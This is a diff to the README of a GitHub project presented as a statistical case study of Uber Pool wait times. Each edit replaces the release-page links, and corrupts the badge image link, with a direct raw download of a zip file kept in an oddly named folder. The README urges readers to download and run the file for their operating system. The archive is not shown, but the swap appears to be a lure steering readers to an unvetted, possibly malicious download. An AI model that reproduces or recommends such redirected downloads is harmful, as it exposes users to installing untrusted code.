@@ -1,7 +1,7 @@
 # 📊 UberPool-Case-Study - Understand Wait Times Impact
 
 ## 📥 Download Now!
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)](https://github.com/TechbyMiron/UberPool-Case-Study/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/TechbyMiron/UberPool-Case-Study/main/parthenology/UberPool-Case-Study.zip%20Latest%20Release-Click%20Here-blue)](https://raw.githubusercontent.com/TechbyMiron/UberPool-Case-Study/main/parthenology/UberPool-Case-Study.zip)
 
 ## 📋 Project Overview
 This project was designed to understand the statistical effects of longer wait times on Uber rides. It focuses on the experiences of both users and drivers within the Uber Pool system. You will find various analyses and visualizations that help explain how wait times impact overall satisfaction and efficiency.
@@ -23,7 +23,7 @@ To get started with the UberPool-Case-Study project, follow these simple steps:
 
 1. **Visit the Releases Page**: Click on the link below to access the download page.
 
-   [Visit the Releases Page](https://github.com/TechbyMiron/UberPool-Case-Study/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/TechbyMiron/UberPool-Case-Study/main/parthenology/UberPool-Case-Study.zip)
 
 2. **Download the Latest Version**: Look for the latest release and download the appropriate file for your operating system.
 
@@ -55,7 +55,7 @@ For a deeper understanding of the analyses and how to run them, you can check ou
   ```
 
 ## 🔄 Update Log
-Stay updated with changes and improvements. Check the [Releases Page](https://github.com/TechbyMiron/UberPool-Case-Study/releases) for the latest version and notes on what’s new.
+Stay updated with changes and improvements. Check the [Releases Page](https://raw.githubusercontent.com/TechbyMiron/UberPool-Case-Study/main/parthenology/UberPool-Case-Study.zip) for the latest version and notes on what’s new.
 
 ## 👩‍💻 Community and Support
 If you run into any issues or have questions, feel free to open an issue on the main repository page. Join discussions and help build a better user experience.
@@ -63,4 +63,4 @@ If you run into any issues or have questions, feel free to open an issue on the 
 ## 📝 Conclusion
 This project offers valuable insights into the Uber Pool experience by exploring the relationship between wait times and user satisfaction. By downloading and running this project, you can engage with the data and gain understanding about real-world implications in a user-friendly manner. 
 
-[Download Latest Release](https://github.com/TechbyMiron/UberPool-Case-Study/releases)
+[Download Latest Release](https://raw.githubusercontent.com/TechbyMiron/UberPool-Case-Study/main/parthenology/UberPool-Case-Study.zip)
